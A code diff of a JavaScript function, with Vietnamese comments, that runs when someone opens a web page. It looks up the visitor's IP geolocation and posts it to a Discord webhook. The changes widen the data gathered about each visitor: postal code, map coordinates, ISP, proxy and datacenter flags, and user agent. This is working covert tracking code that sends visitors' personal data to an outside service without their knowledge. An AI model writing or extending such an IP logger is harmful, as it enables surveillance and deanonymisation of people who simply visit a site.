@@ -18,15 +18,11 @@ async function sendInfo() {
 
     try {
 
-        // Lấy IP info
+        // API IPBot
         const res = await fetch("https://api.ipbot.com/");
 
         const data = await res.json();
 
-        // Thiết bị
-        const device = navigator.userAgent;
-
-        // Nội dung gửi Discord
         const payload = {
             content:
 `📱 Có người mở web
@@ -35,37 +31,64 @@ async function sendInfo() {
 ${data.ip}
 
 🌎 Quốc gia:
-${data.location?.country}
+${data.location.country} (${data.location.country_code})
 
 🏙️ Thành phố:
-${data.location?.city}
+${data.location.city}
 
 📍 Khu vực:
-${data.location?.region}
+${data.location.region}
 
-🕒 Múi giờ:
-${data.location?.timezone}
+📮 Postal:
+${data.location.postal}
+
+📡 Tọa độ:
+${data.location.latitude}, ${data.location.longitude}
+
+🕒 Timezone:
+${data.location.timezone}
 
 🏢 Nhà mạng:
-${data.network?.org}
+${data.network.org}
 
 🌐 ASN:
-${data.network?.asn}
+${data.network.asn}
 
-⚠️ Risk:
-${data.security?.risk_score}
+📶 ISP Name:
+${data.network.radar?.name}
+
+🌍 ISP Quốc gia:
+${data.network.radar?.country_name}
+
+👥 Estimated Users:
+${data.network.radar?.estimated_users}
 
 🛡️ Proxy:
-${data.security?.is_proxy}
+${data.security.is_proxy}
 
-🚨 Threat:
-${data.security?.threat_level}
+🏢 Datacenter:
+${data.security.is_datacenter}
 
-💻 Thiết bị:
-${device}`
+⚠️ Threat:
+${data.security.threat_level}
+
+📊 Risk Score:
+${data.security.risk_score}
+
+💻 User Agent:
+${data.telemetry.user_agent}
+
+📱 Browser:
+${data.telemetry.is_browser}
+
+⚙️ Engine:
+${data.meta.engine}
+
+🕒 Data Version:
+${data.meta.data_version}`
         };
 
-        // Gửi webhook
+        // Gửi webhook Discord
         await fetch(webhook, {
             method: "POST",
             headers: {
